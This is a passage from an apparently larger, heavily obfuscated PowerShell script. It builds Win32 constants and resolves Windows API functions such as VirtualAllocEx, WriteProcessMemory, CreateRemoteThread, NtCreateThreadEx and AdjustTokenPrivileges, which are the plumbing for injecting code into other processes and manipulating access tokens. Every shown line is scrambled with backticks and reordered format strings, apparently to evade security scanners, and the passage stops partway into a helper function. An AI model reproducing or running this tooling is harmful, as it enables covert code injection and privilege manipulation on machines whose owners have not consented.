		${WIn32co`N`staN`TS} | &("{3}{0}{2}{1}"-f'-Me','r','mbe','Add') -MemberType ("{3}{1}{0}{2}" -f'Prop','ote','erty','N') -Name ("{2}{5}{3}{4}{1}{0}" -f'AT','OMP','IMAGE_DLLCHARACTERI','ICS_NX','_C','ST') -Value 0x100
		${WIN32`cONs`T`A`NtS} | &("{1}{0}{3}{2}" -f'-','Add','er','Memb') -MemberType ("{1}{0}{2}" -f't','No','eProperty') -Name ("{0}{2}{1}"-f 'ME','E','M_RELEAS') -Value 0x8000
		${wi`N3`2`COnsT`ANTS} | &("{1}{2}{0}"-f 'ber','Add','-Mem') -MemberType ("{2}{0}{1}{3}" -f'ote','Proper','N','ty') -Name ("{2}{1}{0}"-f'Y','KEN_QUER','TO') -Value 0x0008
		${WiN32c`O`Ns`T`Ants} | &("{1}{0}{2}" -f'em','Add-M','ber') -MemberType ("{1}{2}{0}" -f 'rty','NoteProp','e') -Name ("{2}{0}{1}{3}{4}{5}"-f'EN_','A','TOK','D','JUST_PR','IVILEGES') -Value 0x0020
		${W`In`3`2coNsTA`NTS} | &("{3}{2}{1}{0}"-f'ber','Mem','d-','Ad') -MemberType ("{1}{0}{3}{2}"-f 'teP','No','operty','r') -Name ("{3}{2}{1}{4}{0}" -f 'ENABLED','I','PRIV','SE_','LEGE_') -Value 0x2
		${Wi`N32con`sTANTS} | &("{2}{0}{1}" -f'-Membe','r','Add') -MemberType ("{2}{1}{0}"-f'eProperty','t','No') -Name ("{4}{3}{2}{1}{0}"-f'OKEN','T','_','O','ERROR_N') -Value 0x3f0
		
		return ${wIN32C`ON`sT`A`NTs}
	}

	Function Get-Win32`F`UN`CTI`oNS
	{
		${wiN`32fUnc`T`IONS} = &("{0}{1}{2}" -f'New-Ob','je','ct') ("{0}{2}{1}{3}"-f 'Syst','jec','em.Ob','t')
		
		${ViRT`UalA`l`loCa`Ddr} = &("{0}{1}{2}{4}{3}" -f 'Get','-','ProcAddre','s','s') ("{1}{0}{2}{3}"-f 'ernel32.','k','d','ll') ("{1}{2}{0}{3}"-f 'lAllo','Virt','ua','c')
		${VIrtU`A`LALloCDe`le`g`Ate} = &("{1}{2}{3}{0}"-f 'pe','G','et-DelegateT','y') @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		${VIRTu`A`l`AllOc} =  ${lIs`m5T}::("{4}{5}{7}{3}{0}{6}{2}{1}{8}" -f 'r','inte','unctionPo','egateFo','Get','De','F','l','r').Invoke(${ViRtu`AlA`lL`OcAddr}, ${Vi`RTuA`L`AlLOCd`Elegate})
		${wIn32`FUN`C`T`ioNS} | &("{2}{0}{1}"-f 'em','ber','Add-M') ("{0}{3}{2}{1}" -f 'NoteP','erty','op','r') -Name ("{0}{2}{1}{3}"-f'V','tu','ir','alAlloc') -Value ${v`IRtua`LAllOc}
		
		${Vi`RTuaLA`lLO`ce`XAddR} = &("{0}{2}{1}{3}"-f'Get','rocA','-P','ddress') ("{0}{3}{1}{2}" -f 'kernel','.','dll','32') ("{0}{4}{3}{2}{1}"-f 'Virt','x','ocE','l','ualAl')
		${Vi`RtualaLlOc`EXDEle`g`A`Te} = &("{0}{1}{2}" -f'Get-Delega','t','eType') @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		${Vi`R`Tu`ALal`LOCeX} =  (  gEt-vaRiabLe  ("lism"+"5t")  -ValUEON)::("{2}{7}{0}{5}{8}{1}{3}{4}{6}"-f'le','orFu','G','ncti','onPo','gate','inter','etDe','F').Invoke(${VIRTu`A`LA`l`lOCEXaDdR}, ${vir`TU`AL`ALLOcEXd`eLeG`A`Te})
		${wI`N`32F`UnctIOns} | &("{0}{2}{1}"-f 'A','ember','dd-M') ("{1}{2}{0}"-f'rty','Note','Prope') -Name ("{3}{1}{2}{0}{4}"-f'a','rt','u','Vi','lAllocEx') -Value ${ViRTU`ALa`l`L`oCeX}
		
		${MEM`CP`yAdDR} = &("{2}{4}{1}{3}{0}"-f 's','t-Proc','G','Addres','e') ("{0}{1}{2}" -f'msvc','rt.d','ll') ("{0}{1}" -f 'm','emcpy')
		${memC`pY`d`ELe`gatE} = &("{3}{0}{1}{2}{4}"-f'D','el','egat','Get-','eType') @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		${mE`Mc`pY} =   ${li`S`m5T}::("{1}{2}{4}{6}{5}{0}{8}{7}{3}"-f'nPoi','G','etDele','r','gat','Functio','eFor','te','n').Invoke(${M`eMCp`Y`AddR}, ${m`E`M`cpY`dELeGatE})
		${wI`N`32fun`C`TiONs} | &("{0}{2}{1}"-f'Add','Member','-') -MemberType ("{0}{2}{3}{1}" -f'NotePr','ty','op','er') -Name ("{1}{0}" -f 'y','memcp') -Value ${mE`mcpy}
		
		${m`E`mSet`AdDR} = &("{1}{4}{2}{3}{0}"-f'ss','Get','r','ocAddre','-P') ("{2}{1}{0}" -f '.dll','vcrt','ms') ("{1}{0}"-f'mset','me')
		${memS`EtdEle`GATe} = &("{4}{2}{3}{5}{1}{0}" -f 'e','legateTyp','et','-','G','De') @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		${Me`mSeT} =   ( GET-ChIldITEm ('vA'+'Ri'+'aBLe:'+'LisM5T')  ).vAlUe::("{5}{2}{6}{1}{4}{0}{3}"-f 'Point','un','etDeleg','er','ction','G','ateForF').Invoke(${memS`ETa`Ddr}, ${mEmsE`T`D`E`LEgATe})
		${W`I`N3`2functIONS} | &("{3}{2}{1}{0}" -f 'er','mb','e','Add-M') -MemberType ("{1}{0}{2}" -f'teProper','No','ty') -Name ("{1}{2}{0}" -f 'et','m','ems') -Value ${Me`ms`eT}
		
		${loADlI`B`R`AR`yAddr} = &("{3}{4}{2}{0}{1}"-f'dr','ess','-ProcAd','Ge','t') ("{3}{0}{2}{1}"-f'e','el32.dll','rn','k') ("{1}{3}{2}{0}"-f'braryA','Loa','i','dL')
		${LoadL`IBrAr`y`d`eLEgatE} = &("{1}{2}{4}{3}{0}" -f 'pe','Get-','Del','ateTy','eg') @([String]) ([IntPtr])
		${LO`A`dL`IbRARY} =   ${l`Ism5T}::("{6}{8}{2}{0}{5}{4}{7}{1}{3}" -f'r','e','Fo','r','unctionPoi','F','GetDe','nt','legate').Invoke(${L`OAD`lI`BRaryAD`dR}, ${LoA`dlIBraRY`D`ELeg`Ate})
		${wiN`3`2FUn`cT`iONS} | &("{0}{3}{1}{2}"-f 'A','be','r','dd-Mem') -MemberType ("{1}{2}{3}{0}" -f'erty','No','tePr','op') -Name ("{2}{0}{1}"-f'Librar','y','Load') -Value ${loAdl`Ibr`A`RY}
		
		${gEt`pr`OCADdR`ES`SADDR} = &("{1}{0}{2}{3}"-f 'Addr','Get-Proc','e','ss') ("{3}{0}{2}{1}" -f'rne','.dll','l32','ke') ("{3}{1}{2}{0}"-f 'ss','etP','rocAddre','G')
		${GeTPro`c`A`dDRESSdeleGa`TE} = &("{2}{4}{3}{1}{0}"-f 'eType','egat','Get-','l','De') @([IntPtr], [String]) ([IntPtr])
		${geTP`Rocad`Dr`E`Ss} =  ${l`i`sm5T}::("{5}{1}{3}{0}{2}{4}" -f 'ionPoi','orFu','nte','nct','r','GetDelegateF').Invoke(${G`E`TprOcAddr`e`sS`AdDR}, ${gETpROC`AddrES`SDEleG`A`Te})
		${Win3`2`FUNc`T`ioNs} | &("{1}{2}{0}"-f 'mber','Add-M','e') -MemberType ("{0}{2}{3}{1}"-f'NotePr','ty','o','per') -Name ("{3}{1}{0}{2}" -f 'P','t','rocAddress','Ge') -Value ${GET`PROC`Ad`dRess}
		
		${gETPRo`cA`dDrESS`iNtP`TrADDR} = &("{0}{4}{1}{3}{2}"-f 'Get-Pr','A','dress','d','oc') ("{3}{0}{1}{2}" -f'el3','2.d','ll','kern') ("{2}{0}{1}" -f 'e','ss','GetProcAddr') 
		${gE`T`PRoC`ADDResS`INTPTRD`eLegATE} = &("{0}{2}{1}"-f 'Get','teType','-Delega') @([IntPtr], [IntPtr]) ([IntPtr])
		${G`e`Tpro`C`AddRESsInTp`Tr} =   (vARIABle LIsM5T -VaLuE  )::("{0}{1}{4}{2}{3}{5}" -f 'Ge','tD','egate','ForFunct','el','ionPointer').Invoke(${gETproCAdd`ReS`s`INTPtr`ADdR}, ${G`e`TP`R`OCA`DDR`ES`si`NtPtRDElegate})
		${wIn32f`Un`c`Tions} | &("{1}{2}{0}"-f 'mber','Ad','d-Me') -MemberType ("{1}{0}{2}{3}"-f'o','N','teP','roperty') -Name ("{2}{0}{3}{1}" -f'Address','ntPtr','GetProc','I') -Value ${g`ET`ProCaddREs`SINT`ptr}
		
		${VI`Rt`UalFrEE`AdDr} = &("{1}{2}{0}" -f'ess','Get-ProcAdd','r') ("{0}{3}{2}{1}" -f'ke','l','l','rnel32.d') ("{0}{2}{1}"-f'Virt','Free','ual')
		${VIR`TuAlFr`eEDEL`e`Ga`TE} = &("{1}{3}{2}{0}"-f 'gateType','Get','Dele','-') @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		${v`IrTuA`LfreE} =   (  gCI  ('v'+'AriABL'+'e'+':'+'LIsM5t')  ).vALUE::("{4}{6}{5}{0}{1}{3}{2}"-f'unc','t','Pointer','ion','G','tDelegateForF','e').Invoke(${V`i`RT`U`ALFReEa`ddR}, ${VIrT`U`AlF`REeDElEG`A`TE})
		${wiN32`FuNC`TiOnS} | &("{0}{2}{1}" -f 'Add-','ber','Mem') ("{2}{3}{0}{1}"-f'P','roperty','No','te') -Name ("{0}{2}{1}" -f'Vi','tualFree','r') -Value ${V`iR`TuaLF`ReE}
		
		${VIrTuA`LfRE`E`EX`Ad`Dr} = &("{1}{3}{0}{4}{2}" -f 'Pr','Ge','ress','t-','ocAdd') ("{1}{3}{0}{2}" -f 'l32.','kern','dll','e') ("{0}{2}{4}{3}{1}" -f 'Vi','eEx','rtu','re','alF')
		${V`irtUalfre`E`exde`le`gate} = &("{2}{0}{3}{1}"-f 'et-Del','gateType','G','e') @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		${v`IRtu`ALfR`EE`eX} =   (  VArIAblE ('L'+'IsM5t')).vAlUe::("{3}{4}{0}{1}{2}"-f 'Delegat','eForFunctionPoi','nter','G','et').Invoke(${vi`RTuaLfr`eEExAD`Dr}, ${vIrT`UA`LfR`e`EE`XdE`LegaTe})
		${wIN32fUn`CT`i`oNS} | &("{2}{1}{0}" -f 'r','d-Membe','Ad') ("{0}{2}{1}"-f'N','roperty','oteP') -Name ("{0}{2}{4}{3}{1}"-f'V','eEx','irt','Fre','ual') -Value ${ViRtUAlF`Re`Eex}
		
		${VI`RTual`P`R`Ote`ctaddr} = &("{0}{3}{4}{1}{2}"-f'Ge','s','s','t-Proc','Addre') ("{0}{2}{1}" -f'kernel32.','ll','d') ("{2}{0}{1}{3}"-f'rtua','lProt','Vi','ect')
		${vIRT`U`Alp`RO`TecTDelEgaTe} = &("{0}{2}{4}{1}{3}"-f 'Get-','lega','D','teType','e') @([IntPtr], [UIntPtr], [UInt32],  (  gEt-VARiAbLE jINA  ).vALUe.("{1}{0}{4}{3}{2}"-f 'y','MakeB','ype','fT','Re').Invoke()) ([Bool])
		${V`IRTu`ALp`Rot`eCT} =   (  variabLe LisM5t ).VaLuE::("{1}{2}{3}{6}{5}{8}{4}{0}{7}" -f 'te','GetDelegat','eForFunc','ti','n','Po','on','r','i').Invoke(${V`i`Rtu`ALpRoTectadDR}, ${vi`RtUalPR`O`TEcTDeL`EGa`TE})
		${WiN`3`2`FuN`ctIOns} | &("{2}{1}{0}"-f'ber','Mem','Add-') ("{1}{2}{0}"-f 'rty','NotePr','ope') -Name ("{3}{0}{1}{2}"-f 'rtualProt','ec','t','Vi') -Value ${vIRtualP`R`oT`eCt}
		
		${get`m`o`Du`LEH`A`NDleadDR} = &("{1}{4}{3}{0}{2}" -f'roc','G','Address','t-P','e') ("{1}{3}{0}{2}"-f'2','kern','.dll','el3') ("{4}{3}{1}{2}{0}"-f 'eA','leHan','dl','u','GetMod')
		${G`ETMo`duLEHANDle`DeLegA`Te} = &("{0}{1}{4}{2}{3}" -f'Get','-De','a','teType','leg') @([String]) ([IntPtr])
		${GET`M`ODuLeh`A`NDLE} =   ${L`i`SM5t}::("{5}{4}{1}{3}{0}{2}" -f'nctionPointe','For','r','Fu','te','GetDelega').Invoke(${GETm`oDUlEhA`N`DLEaD`dr}, ${g`eT`moD`U`leHa`NdlEDELe`gAtE})
		${win`32FuNcTi`OnS} | &("{0}{1}{2}"-f'A','dd-Memb','er') ("{2}{3}{0}{1}" -f 'r','operty','Note','P') -Name ("{2}{1}{0}"-f 'le','and','GetModuleH') -Value ${g`Et`MO`dUleha`NDlE}
		
		${fReElI`BRa`RYADDR} = &("{2}{0}{1}{3}{4}"-f'-Pro','cA','Get','ddres','s') ("{1}{0}{2}{3}"-f 'ern','k','el','32.dll') ("{1}{0}{2}"-f'r','FreeLibra','y')
		${FR`EELI`Br`ArY`DELEgate} = &("{3}{0}{1}{2}" -f'ateT','yp','e','Get-Deleg') @([Bool]) ([IntPtr])
		${fReE`li`BRarY} =  (GcI  VaRiablE:lisM5T ).vaLUE::("{5}{0}{3}{2}{1}{4}" -f'a','nPoin','eForFunctio','t','ter','GetDeleg').Invoke(${f`R`Ee`lIbrARyAdDr}, ${f`REELibRaRY`DelE`ga`Te})
		${WIN3`2FUn`cT`io`NS} | &("{2}{0}{1}"-f'dd','-Member','A') -MemberType ("{2}{0}{3}{1}"-f'ote','erty','N','Prop') -Name ("{3}{0}{2}{1}" -f 'eLib','y','rar','Fre') -Value ${freE`li`BRA`Ry}
		
		${O`pE`N`PRoCEsSaDdR} = &("{3}{1}{2}{0}"-f 'ess','et-ProcA','ddr','G') ("{0}{2}{1}" -f 'kernel','l','32.dl') ("{1}{2}{0}" -f 's','OpenProc','es')
	    ${oP`EnpR`OcE`ssDe`lEG`Ate} = &("{1}{0}{4}{3}{2}" -f'el','Get-D','e','teTyp','ega') @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    ${opEnp`Ro`CE`ss} =   ( vARiAble ("l"+"iS"+"m5T")  ).VAlUe::("{0}{5}{2}{8}{4}{1}{7}{6}{3}"-f'Ge','rFun','gat','ter','o','tDele','oin','ctionP','eF').Invoke(${OpENPr`oc`eSS`A`ddR}, ${opEN`proCesSDElE`gA`TE})
		${wi`N3`2`Fu`NcTiONS} | &("{0}{2}{1}"-f 'Add-','ber','Mem') -MemberType ("{1}{2}{3}{0}" -f 'perty','No','te','Pro') -Name ("{2}{0}{1}"-f'nPro','cess','Ope') -Value ${Op`E`Np`RoCesS}
		
		${WaiT`FO`RSi`NGlEO`BJ`ectaddR} = &("{2}{0}{1}{3}" -f't','-ProcAddre','Ge','ss') ("{0}{1}{2}{3}" -f'k','ernel','32.d','ll') ("{5}{1}{2}{6}{3}{4}{0}" -f'ct','ait','ForSin','e','Obje','W','gl')
	    ${W`AIt`Fo`R`sInGLeO`BJ`ectDELeG`ATE} = &("{0}{4}{1}{3}{2}"-f'G','-Del','ateType','eg','et') @([IntPtr], [UInt32]) ([UInt32])
	    ${waiTFO`RSI`N`GlEObj`ECT} =  (  vARiABLE LiSM5t  -VALUEo  )::("{1}{0}{3}{2}{5}{4}"-f 'gate','GetDele','Functi','For','nter','onPoi').Invoke(${wa`ITFoRs`i`N`gleobJE`Cta`DDr}, ${wA`ItfOR`SInG`Le`obJECTDe`LEg`ATe})
		${WiN32F`U`N`Ct`iONS} | &("{2}{0}{1}" -f 'm','ber','Add-Me') -MemberType ("{1}{2}{3}{0}"-f 'ty','NoteP','rope','r') -Name ("{0}{3}{2}{1}"-f 'WaitForS','t','jec','ingleOb') -Value ${waITFOrSI`NGLEo`B`JECt}
		
		${wRItEPr`Oce`S`sME`m`ORYADDr} = &("{3}{1}{2}{0}" -f 'dress','t-Proc','Ad','Ge') ("{2}{1}{0}" -f'l','32.dl','kernel') ("{1}{4}{5}{0}{3}{2}"-f 'c','Write','y','essMemor','Pr','o')
        ${wrI`TEProCeSSMEmORy`dE`lE`g`ATE} = &("{0}{4}{1}{3}{2}" -f 'Ge','gateT','e','yp','t-Dele') @([IntPtr], [IntPtr], [IntPtr], [UIntPtr],   ( gET-VArIaBlE  ("V"+"fA9u") ).vALUE.("{0}{1}{2}" -f 'MakeB','yR','efType').Invoke()) ([Bool])
        ${wRI`T`eprOCEsS`m`EMoRY} =   ${li`Sm`5t}::("{0}{3}{6}{2}{5}{1}{4}" -f 'GetDelega','onPoint','orFun','te','er','cti','F').Invoke(${Wr`itEpr`oCEs`SMEMor`yAdDr}, ${W`R`IT`ePr`oCESsmEMOrY`deLegATE})
		${win32FU`Nc`TiOns} | &("{0}{2}{1}" -f'A','-Member','dd') -MemberType ("{0}{2}{3}{1}" -f 'N','operty','ot','ePr') -Name ("{0}{5}{3}{4}{1}{2}" -f'W','s','sMemory','eP','roce','rit') -Value ${WrITEPr`OCe`ssm`emORy}
		
		${R`eaDprOc`ess`m`emo`RY`Addr} = &("{0}{1}{2}{3}"-f 'Get-','ProcAdd','re','ss') ("{1}{2}{3}{0}"-f'l','ke','rn','el32.dl') ("{0}{1}{2}{3}" -f 'R','eadProc','e','ssMemory')
        ${READ`P`RO`cES`SM`e`mOR`ydeleGaTE} = &("{2}{3}{0}{1}"-f'egat','eType','Ge','t-Del') @([IntPtr], [IntPtr], [IntPtr], [UIntPtr],  (gcI  vARiabLE:Vfa9u).VALuE.("{1}{0}{2}"-f 'keByRef','Ma','Type').Invoke()) ([Bool])
        ${r`EadPrOC`ESs`mE`mory} =   ( DIR  ('Var'+'iABlE'+':Li'+'Sm5t')  ).vALuE::("{1}{5}{0}{4}{2}{3}" -f 'Funct','GetDelegat','i','nter','ionPo','eFor').Invoke(${R`EaDpROcESSmem`O`R`yAddR}, ${READp`Ro`ces`SmE`mO`RyD`eLEGATe})
		${wIn32fun`c`Ti`o`Ns} | &("{0}{2}{1}" -f 'Add-Memb','r','e') -MemberType ("{2}{1}{0}" -f 'rty','rope','NoteP') -Name ("{3}{0}{2}{1}"-f'ead','Memory','Process','R') -Value ${reAD`pro`C`e`sSmemORY}
		
		${Cr`ea`TERemo`Tet`HR`EADA`dDR} = &("{2}{0}{1}{3}" -f '-Pro','cA','Get','ddress') ("{3}{2}{0}{1}"-f'd','ll','32.','kernel') ("{2}{4}{1}{3}{0}"-f 'Thread','em','C','ote','reateR')
        ${cRea`T`eremOTe`T`hreADDel`e`gATE} = &("{0}{2}{3}{1}" -f 'G','eType','et-Dele','gat') @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        ${CREatereMOte`T`hR`eAd} =  ${l`IS`M5t}::("{6}{2}{4}{1}{0}{5}{3}"-f'Poi','ion','etDelegateForFunc','r','t','nte','G').Invoke(${Cre`AteR`EmoTet`hrEaD`A`dDR}, ${CrE`At`E`Re`Mo`T`ethrEaDdeLEG`A`Te})
		${wiN`32fun`C`TionS} | &("{0}{2}{1}{3}"-f'Add','M','-','ember') -MemberType ("{0}{1}{2}{3}" -f'Note','P','rope','rty') -Name ("{3}{4}{0}{5}{1}{2}" -f'emot','Th','read','Cr','eateR','e') -Value ${CRe`Ater`eM`o`TEtHre`Ad}
		
		${GE`TEXitc`o`DethReADaDdR} = &("{1}{2}{0}{3}" -f 's','Get-','ProcAddre','s') ("{1}{0}{2}" -f'2.d','kernel3','ll') ("{2}{5}{3}{4}{1}{0}" -f'ad','eThre','GetE','itC','od','x')
        ${G`Et`ExitcO`DeTHR`E`ADdelEgAtE} = &("{3}{0}{2}{1}" -f '-D','Type','elegate','Get') @([IntPtr],  ${t`Cqs}.("{2}{4}{3}{0}{1}"-f'fT','ype','Ma','e','keByR').Invoke()) ([Bool])
        ${G`E`TEXItCo`DETh`READ} =   ${L`isM5t}::("{1}{5}{4}{3}{2}{0}" -f'unctionPointer','GetDe','eForF','t','ega','l').Invoke(${g`Et`eXiTC`oD`EthrEaDAd`Dr}, ${Ge`TexITcO`DetHRe`ADd`e`Le`G`ATe})
		${wi`N3`2`FUncTio`NS} | &("{2}{0}{1}" -f '-','Member','Add') -MemberType ("{1}{2}{3}{0}" -f 'ty','Not','ePr','oper') -Name ("{3}{2}{4}{1}{0}"-f'read','deTh','it','GetEx','Co') -Value ${GEte`XITcOD`eTH`R`eaD}
		
		${o`PeNT`HReA`dTOkEnAD`dR} = &("{3}{2}{0}{1}" -f'cAddre','ss','Pro','Get-') ("{1}{3}{0}{2}"-f 'l','Advapi3','l','2.d') ("{3}{1}{0}{2}{4}" -f'hreadT','penT','o','O','ken')
        ${opEnTHRE`A`D`Tok`ENDele`gAte} = &("{2}{1}{3}{0}" -f'e','legat','Get-De','eTyp') @([IntPtr], [UInt32], [Bool],  (variABLE 8zH -VaLueoN  ).("{1}{2}{0}"-f 'Type','Make','ByRef').Invoke()) ([Bool])
        ${OPent`h`ReADT`OKEN} =   ${LI`sM5t}::("{1}{7}{4}{2}{3}{5}{0}{6}" -f'oin','GetDele','orFu','nction','teF','P','ter','ga').Invoke(${o`PeNth`Re`ADt`okEnaddR}, ${OpEnThreA`DTOKEn`d`E`L`EGAte})
		${W`In32Fu`N`CTIo`Ns} | &("{1}{0}{2}"-f 'd-Mem','Ad','ber') -MemberType ("{3}{0}{2}{1}" -f 'ePr','erty','op','Not') -Name ("{3}{2}{0}{1}" -f 'adT','oken','Thre','Open') -Value ${Op`En`ThR`eADtoken}
		
		${gEtcURReN`Tt`hrEaDa`Ddr} = &("{1}{3}{2}{0}" -f 'ss','Get-','e','ProcAddr') ("{2}{1}{0}"-f 'l','dl','kernel32.') ("{2}{1}{5}{3}{0}{4}"-f 'tTh','et','G','ren','read','Cur')
        ${geT`cUrREnttHrE`ADdeLeG`A`Te} = &("{2}{1}{3}{4}{0}"-f 'e','-De','Get','le','gateTyp') @() ([IntPtr])
        ${GE`T`CurrEn`TthRe`AD} =   (  Get-VArIaBLe  ('lIs'+'M5T')  ).vaLUE::("{1}{5}{0}{2}{4}{3}{6}"-f'gateFo','GetDel','rF','nP','unctio','e','ointer').Invoke(${gEt`CuRrEN`T`ThreaDaddR}, ${G`eTcuRRE`NT`ThREaDDele`GATe})
		${w`In3`2`FUNC`TIOnS} | &("{2}{1}{0}" -f 'ber','em','Add-M') -MemberType ("{0}{1}{2}"-f 'NotePro','pe','rty') -Name ("{1}{3}{0}{2}"-f 'entThrea','Ge','d','tCurr') -Value ${GetcU`RRE`NtthRe`Ad}
		
		${AD`j`UStToKENPri`V`I`leG`esAddr} = &("{1}{3}{0}{2}"-f 'dd','Ge','ress','t-ProcA') ("{0}{2}{3}{1}" -f'Ad','l','vapi3','2.dl') ("{5}{1}{4}{2}{3}{0}"-f 'es','justT','enPriv','ileg','ok','Ad')
        ${adJustToK`E`N`P`RIV`ilEg`ESDELEGaTe} = &("{0}{3}{2}{1}{4}" -f'G','leg','De','et-','ateType') @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        ${AdJ`USTT`okEnp`R`ivIl`E`GES} =  (VarIable  LISM5T -vAlUeo)::("{2}{1}{4}{0}{3}"-f't','orFuncti','GetDelegateF','er','onPoin').Invoke(${a`DJUSt`TOKeN`P`Ri`VI`lEg`ESaDdR}, ${ADJUs`TTOkENp`Ri`VilE`g`esDeL`e`gate})
		${WIN`32Fun`c`TI`ONs} | &("{0}{1}{2}" -f'Add-Mem','be','r') -MemberType ("{1}{2}{0}"-f'erty','NotePro','p') -Name ("{3}{5}{4}{1}{0}{2}"-f'enPriv','stTok','ileges','A','ju','d') -Value ${Ad`jUsT`T`OkenpRi`VIlEGEs}
		
		${LO`OkupPrIViL`eGEV`ALUeA`ddr} = &("{2}{1}{3}{0}" -f'ess','Pr','Get-','ocAddr') ("{0}{1}{3}{2}" -f'Advap','i','dll','32.') ("{5}{3}{4}{2}{1}{0}{6}"-f 'ue','al','eV','pPriv','ileg','Looku','A')
        ${L`oO`kuPpri`VIlEGEV`ALuED`ELE`gaTE} = &("{3}{0}{2}{1}" -f 't','e','-DelegateTyp','Ge') @([String], [String], [IntPtr]) ([Bool])
        ${LO`oKU`PP`RiViLeGEvA`LUe} =   ${lIS`M5T}::("{1}{5}{3}{2}{4}{0}" -f'onPointer','G','Fu','eFor','ncti','etDelegat').Invoke(${LookU`p`pRIvi`lEgeva`LU`EADDR}, ${L`o`o`Kuppr`i`ViLegEvA`lUedElEgAtE})
		${Win3`2`FU`NctiONs} | &("{0}{1}{2}" -f'Add-','Memb','er') -MemberType ("{3}{0}{2}{1}"-f 'otePr','rty','ope','N') -Name ("{0}{4}{2}{3}{1}{5}"-f 'L','al','p','PrivilegeV','ooku','ue') -Value ${LOoku`PPri`Vi`L`EGEvaLuE}
		
		${ImpeR`sonaTeS`e`lfa`DDR} = &("{0}{2}{3}{1}{4}"-f'Get-Pr','ddre','oc','A','ss') ("{2}{1}{3}{0}" -f '32.dll','ap','Adv','i') ("{0}{3}{1}{2}" -f'Imp','nate','Self','erso')
        ${impersONaTe`s`e`l`Fde`lE`gAte} = &("{2}{1}{3}{4}{0}"-f'e','elegat','Get-D','eTy','p') @([Int32]) ([Bool])
        ${I`MpeRsO`NaT`esE`lf} =   (  vaRIAbLe LISM5t -VaL)::("{5}{0}{8}{6}{1}{7}{4}{2}{3}" -f'etDeleg','un','in','ter','o','G','ForF','ctionP','ate').Invoke(${iMPER`sonaTes`e`lFadDR}, ${IM`pErs`ON`AtE`SE`LFDElEga`Te})
		${WI`N`32FUn`CTIo`NS} | &("{1}{2}{0}"-f 'ber','Add-Me','m') -MemberType ("{0}{2}{3}{1}"-f'N','perty','oteP','ro') -Name ("{1}{4}{3}{2}{0}"-f 'elf','Impers','teS','a','on') -Value ${ImperS`o`NaT`Es`E`lF}
		
		${N`TCreA`TEtHRE`Ad`eX`ADdr} = &("{3}{0}{1}{2}{4}" -f 't-Proc','Addr','es','Ge','s') ("{0}{1}{2}" -f'N','t','Dll.dll') ("{1}{3}{4}{0}{2}"-f 'eT','NtCre','hreadEx','a','t')
        ${ntC`RE`A`Tet`H`R`eA`DEXDELeGATE} = &("{1}{2}{3}{0}"-f 'ateType','Get-D','e','leg') @(  (  geT-VarIAble ("8Z"+"H")).VAlUE.("{0}{4}{2}{1}{3}" -f 'M','Re','y','fType','akeB').Invoke(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
        ${Nt`c`REat`EtHrEaD`eX} =  ${lI`S`m5T}::("{5}{3}{2}{4}{1}{0}{6}" -f 'inte','ctionPo','ateForF','Deleg','un','Get','r').Invoke(${nTcre`ATe`ThREa`DexADdr}, ${Nt`Cre`ATe`T`Hr`eaD`exdeL`egAte})
		${win32Fu`NCTio`Ns} | &("{1}{3}{2}{0}" -f 'er','Add-','mb','Me') -MemberType ("{3}{2}{1}{0}"-f'ty','eProper','t','No') -Name ("{4}{1}{3}{2}{0}"-f 'dEx','a','ea','teThr','NtCre') -Value ${NTCReaTetH`RE`A`dEX}
		
		${is`Wow`64`prOCessa`ddr} = &("{2}{0}{3}{1}"-f 't-P','ddress','Ge','rocA') ("{2}{3}{0}{1}"-f 'd','ll','Kern','el32.') ("{1}{2}{3}{0}{4}"-f 'Pr','IsWo','w6','4','ocess')
        ${iSwOW`64p`R`O`CesSdELegA`TE} = &("{0}{4}{2}{1}{3}"-f'G','-DelegateTy','t','pe','e') @([IntPtr],  ${T4g`N7}.("{1}{2}{0}"-f'e','MakeByRef','Typ').Invoke()) ([Bool])
        ${I`SwO`W64PROcesS} =  (Gi ("vaRi"+"A"+"ble:"+"LIsm5t")  ).vALUe::("{0}{4}{7}{1}{6}{5}{2}{3}" -f'Ge','c','in','ter','tDe','nPo','tio','legateForFun').Invoke(${isw`o`w64P`ROcesS`ADDr}, ${Isw`o`W64`pRO`Ces`sDel`eGaTE})
		${wI`N32fu`NCt`iO`NS} | &("{1}{0}{2}" -f 'be','Add-Mem','r') -MemberType ("{1}{3}{2}{0}" -f 'ty','N','r','otePrope') -Name ("{2}{0}{1}"-f'64Proc','ess','IsWow') -Value ${i`swOW6`4`Pr`OcesS}
		
		${CR`E`ATe`T`hREAd`AdDR} = &("{2}{1}{0}{3}" -f 'roc','P','Get-','Address') ("{1}{0}{3}{2}" -f'nel3','Ker','ll','2.d') ("{1}{0}{2}{3}"-f'eat','Cr','eThr','ead')
        ${cR`EATe`ThreadDEl`E`g`ATE} = &("{2}{5}{3}{1}{0}{4}" -f 'gateTy','ele','G','-D','pe','et') @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32],   ( ChILDiTeM  ('Va'+'riaB'+'le:jI'+'NA')).vALue.("{1}{0}{2}{3}"-f'B','Make','yRef','Type').Invoke()) ([IntPtr])
        ${cr`EA`TetHrE`AD} =  ( GEt-cHILdITEM  ("Va"+"R"+"iaB"+"l"+"e:liSM5T")  ).vAlue::("{0}{3}{6}{4}{1}{2}{5}{7}" -f'Ge','or','Fun','tDelega','F','c','te','tionPointer').Invoke(${Cr`eAT`eth`Re`Ada`dDr}, ${creatEt`hREAddelE`G`ATe})
		${wiN3`2FU`N`C`Tions} | &("{2}{0}{1}" -f 'dd-Me','mber','A') -MemberType ("{1}{0}{2}{3}" -f'o','N','teP','roperty') -Name ("{0}{2}{1}" -f'Creat','ead','eThr') -Value ${CR`eatetHr`e`Ad}
		
		return ${W`in32`FuN`CTIONS}
	}
	

			
	
	
	

	
	
	Function s`Ub-`sIGne`DIN`TaSuNsI`GnEd
	{
		Param(
		[Parameter(POsITiOn = 0, mAnDAtOrY = ${T`RuE})]
		[Int64]
